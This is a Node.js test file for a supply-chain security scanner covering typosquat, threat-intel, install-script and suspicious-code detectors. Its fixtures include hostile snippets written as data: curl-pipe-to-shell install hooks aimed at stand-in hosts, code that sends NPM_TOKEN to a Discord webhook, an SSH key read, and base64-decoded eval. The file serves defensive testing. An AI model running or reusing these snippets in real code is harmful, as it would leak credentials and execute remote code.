import { test } from 'node:test';
import assert from 'node:assert/strict';
import { detectTyposquats, findImitated } from '../src/detectors/typosquat.js';
import { detectThreatIntel, loadSnapshot } from '../src/detectors/threatintel.js';
import { detectInstallScripts, detectSuspiciousCode } from '../src/detectors/patterns.js';
import { scoreFindings } from '../src/detectors/scoring.js';
import { runDetectors } from '../src/detectors/index.js';

const dep = (name, version, ecosystem = 'npm') => ({ name, version, range: version, ecosystem, file: 'package.json', direct: true, depth: 0, dev: false });

test('typosquat: flags look-alikes, not popular or legit names', () => {
  assert.equal(findImitated('crossenv'), 'cross-env');
  assert.equal(findImitated('expresss'), 'express');
  assert.equal(findImitated('lodsh'), 'lodash');
  assert.equal(findImitated('reqeusts', 'PyPI'), 'requests');
  assert.equal(findImitated('python3-dateutil', 'PyPI'), 'python-dateutil');
  assert.equal(findImitated('jeIlyfish', 'PyPI'), 'jellyfish');
  for (const ok of ['express', 'react', 'preact', 'lodash', 'jsdom', 'safer-buffer', '@types/node', 'left-pad']) {
    assert.equal(findImitated(ok), null, ok);
  }
  const f = detectTyposquats([dep('crossenv', '1.0.0'), dep('crossenv', '1.0.0'), dep('react', '18.0.0')]);
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, 'high');
  assert.equal(f[0].fix, 'Replace with cross-env');
});

test('threat intel: matches exact and wildcard versions', () => {
  const rows = loadSnapshot();
  assert.ok(rows.length >= 15);
  const f = detectThreatIntel([
    dep('event-stream', '3.3.6'),
    dep('event-stream', '4.0.1'),
    dep('crossenv', '6.1.1'),
    dep('CTX', '0.2.2', 'PyPI'),
    dep('ctx', '0.2.2', 'npm'), // wrong ecosystem
  ]);
  assert.deepEqual(f.map((x) => x.package).sort(), ['CTX', 'crossenv', 'event-stream']);
  assert.ok(f.every((x) => x.type === 'malicious' && x.source === 'snapshot'));
});

test('install scripts: severity by location and content', () => {
  const files = [
    { path: 'node_modules/evil/package.json', content: JSON.stringify({ name: 'evil', version: '1.0.0', scripts: { postinstall: 'curl http://x.sh | sh' } }, null, 2) },
    { path: 'node_modules/@s/meh/package.json', content: JSON.stringify({ name: '@s/meh', scripts: { install: 'node-gyp rebuild' } }) },
    { path: 'package.json', content: JSON.stringify({ name: 'app', scripts: { postinstall: 'husky install', test: 'node --test' } }) },
    { path: 'node_modules/bad/package.json', content: '{not json' },
  ];
  const f = detectInstallScripts(files);
  const by = Object.fromEntries(f.map((x) => [x.package, x]));
  assert.equal(f.length, 3);
  assert.equal(by.evil.severity, 'high');
  assert.equal(by.evil.line, 5);
  assert.equal(by['@s/meh'].severity, 'medium');
  assert.equal(by.app.severity, 'low');
});

test('suspicious code: each rule fires with line + evidence', () => {
  const blob = 'A'.repeat(450);
  const files = [
    { path: 'node_modules/x/a.js', content: `// hi\neval(Buffer.from("ZXZpbA==", "base64").toString())` },
    { path: 'src/telemetry.js', content: `const t = process.env.NPM_TOKEN;\nfetch("https://discord.com/api/webhooks/1/2", { body: t });` },
    { path: 'b.js', content: `fs.readFileSync(home + "/.ssh/id_rsa")` },
    { path: 'i.sh', content: `#!/bin/sh\ncurl -s https://evil.sh/x | bash` },
    { path: 'c.js', content: `require("child_process").exec(x); https.get(u)` },
    { path: 'd.js', content: `const p = "${blob}";` },
    { path: 'e.py', content: `import base64\nexec(base64.b64decode(p))` },
    { path: 'clean.js', content: 'console.log(process.env.HOME)' },
    { path: 'readme.md', content: 'curl x | sh' },
  ];
  const f = detectSuspiciousCode(files);
  const ids = f.map((x) => x.ruleId).sort();
  assert.deepEqual(ids, [
    'child-process-network', 'credential-file-read', 'env-exfiltration', 'exfil-webhook',
    'long-encoded-blob', 'obfuscated-eval', 'python-exec-decode', 'remote-shell',
  ]);
  const ev = f.find((x) => x.ruleId === 'obfuscated-eval');
  assert.equal(ev.line, 2);
  assert.equal(ev.package, 'x');
  assert.ok(f.every((x) => !x.evidence || x.evidence.length <= 160));
  assert.equal(f.find((x) => x.ruleId === 'remote-shell').line, 2);
});

test('scoring', () => {
  assert.deepEqual(scoreFindings([]), { score: 0, level: 'safe', counts: { critical: 0, high: 0, medium: 0, low: 0 } });
  assert.equal(scoreFindings([{ severity: 'low' }]).level, 'low');
  assert.equal(scoreFindings([{ severity: 'high' }]).level, 'medium');
  assert.equal(scoreFindings([{ severity: 'critical' }, { severity: 'high' }]).level, 'high');
  assert.equal(scoreFindings(Array(5).fill({ severity: 'critical' })).score, 100);
});

test('runDetectors offline merges and sorts', async () => {
  const { findings, warnings } = await runDetectors(
    [dep('crossenv', '1.0.0')],
    [{ path: 'package.json', content: JSON.stringify({ scripts: { postinstall: 'echo hi' } }) }],
    { offline: true },
  );
  assert.equal(warnings.length, 1);
  assert.deepEqual(findings.map((f) => f.severity), ['critical', 'high', 'low']);
});
